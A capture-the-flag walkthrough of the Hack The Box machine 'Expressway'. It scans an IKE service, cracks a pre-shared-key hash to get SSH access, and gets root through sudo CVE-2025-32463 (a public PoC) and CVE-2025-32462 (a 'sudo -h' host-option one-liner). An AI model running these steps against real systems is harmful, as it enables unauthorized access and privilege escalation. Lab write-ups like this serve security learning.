# Expressway HTB machine writeup

## Box info
- OS : Linux
- Difficulty : easy
- Points : 30

## Enumeration 
- After connecting to HTB vpn and spawning the box , we perform an nmap scan to look for open ports , we only find one open tcp port :
```
└─$ sudo nmap 10.129.175.221 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 10:38 CET
Nmap scan report for 10.129.175.221
Host is up (0.24s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 2.96 seconds
```
- Seeing the picture attached with the box , the number 500 appears , i thought maybe port 500 will be open ? Apparently not !
```
└─$ sudo nmap -p500 10.129.175.221
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 10:41 CET
Nmap scan report for 10.129.175.221
Host is up (0.17s latency).

PORT    STATE  SERVICE
500/tcp closed isakmp

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```
- What about udp port 500 ?
```
└─$ sudo nmap -sU -sC -sV -p500 10.129.175.221
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 10:43 CET
Nmap scan report for 10.129.175.221
Host is up (0.15s latency).

PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.10 seconds
```
- Lesgooo , here we have it , ChatGPT says the following :
```
ISAKMP, or the Internet Security Association and Key Management Protocol, is a framework and protocol for establishing secure communication by negotiating security parameters and managing cryptographic keys
```

## Uers flag
- We can use `ike-scan` for further enumeration , `-A`  stands for aggressive mode
```
└─$ sudo ike-scan -A 10.129.175.221
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.175.221	Aggressive Mode Handshake returned HDR=(CKY-R=bdeb77d50e89e42f) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.160 seconds (6.26 hosts/sec).  1 returned handshake; 0 returned notify
```
- Good catch , we found the fully qualified domain name of a user named ike `ID(Type=ID_USER_FQDN,Value=ike@expressway.htb)` .
- Next we will try to extract a psk hash with the obtained id :
```
└─$ sudo ike-scan -A --id=ike@expressway.htb 10.129.175.221 --pskcrack
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.175.221	Aggressive Mode Handshake returned HDR=(CKY-R=b04cf004645a1fa6) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
e6X:X:X:X:X:X:X:X:X
Ending ike-scan 1.9.6: 1 hosts scanned in 0.214 seconds (4.68 hosts/sec).  1 returned handshake; 0 returned notify
```
- We crack the hash with psk-crack :
```
└─$ psk-crack hash.txt -d /usr/share/wordlists/rockyou.txt 
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/) Running in dictionary cracking mode key 
"<REDACTED>" matches SHA1 hash e3f7c105f12e24cd0d9e1296e5e...
Ending psk-crack: 8045040 iterations in 12.225 seconds (658100.52 iterations/sec)
```
- We ssh to the server with the user ike and get the user flag :
```
└─$ ssh ike@10.129.175.221
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.175.221' (ED25519) to the list of known hosts.
ike@10.129.175.221's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ike@expressway:~$ wc user.txt
 1  1 33 user.txt
 ```

 ## Root flag

 - We start we the basics :
 ```
 ike@expressway:~$ whoami
ike
```
```
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```
```
ike@expressway:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

Password: 
Sorry, try again.
Password: 
Sorry, user ike may not run sudo on expressway.
```
- Check the sudo version : 
```
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```
- It's an easy box , so upon searching the sudo version , I came across two recent CVEs and both seem pretty promising .

### CVE-2025-32463
- A public PoC already exist [here](https://github.com/MohamedKarrab/CVE-2025-32463) so let's try it , the process is pretty straight forward and requires little to no experience other than uploading the exploit to the server :
```
ike@expressway:~$ cd CVE-2025-32463/
ike@expressway:~/CVE-2025-32463$ ls
archs-dynamic  get_root.py  LICENSE           README.md
archs-static   get_root.sh  mkall-dynamic.sh
ike@expressway:~/CVE-2025-32463$ ./get_root.sh 
[*] Detected architecture: x86_64
[*] Launching sudo with archs-dynamic payload …
root@expressway:/# whoami
root
```

### CVE-2025-32462
- According to this [blog](https://access.redhat.com/security/cve/cve-2025-32462) :
`A privilege escalation vulnerability was found in Sudo. In certain configurations, unauthorized users can gain elevated system privileges via the Sudo host option (-h or --host). When using the default sudo security policy plugin (sudoers), the host option is intended to be used in conjunction with the list option (-l or --list) to determine what permissions a user has on a different system. However, this restriction can be bypassed, allowing a user to elevate their privileges on one system to the privileges they may have on a different system, effectively ignoring the host identifier in any sudoers rules. This vulnerability is particularly impactful for systems that share a single sudoers configuration file across multiple computers or use network-based user directories, such as LDAP, to provide sudoers rules on a system.`
- Hmm , we are in the proxy group , let's see what we can with that :
```
ike@expressway:~$ find / -group proxy -type f 2>/dev/null
/var/spool/squid/netdb.state
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```
- Checking `access.log.1` for any valuable information , we find a vhost `offramp.expressway.htb` , we try to exploit the CVE :
```
ike@expressway:/usr/bin$ sudo -h offramp.expressway.htb ./whoami
root
```
- So we spawn a root shell :
```
ike@expressway:/usr/bin$ sudo -h offramp.expressway.htb ./bash
root@expressway:/usr/bin# cd ~
root@expressway:~# wc root.txt
 1  1 33 root.txt
```

# Notes
- I noticed that there are indeed two different sudo binaries , but i didn't really know how to use this piece of information since the vulnerable version is the one being run by default :( 
- TFTP service is also running on the server but I couldn't find anything useful there 
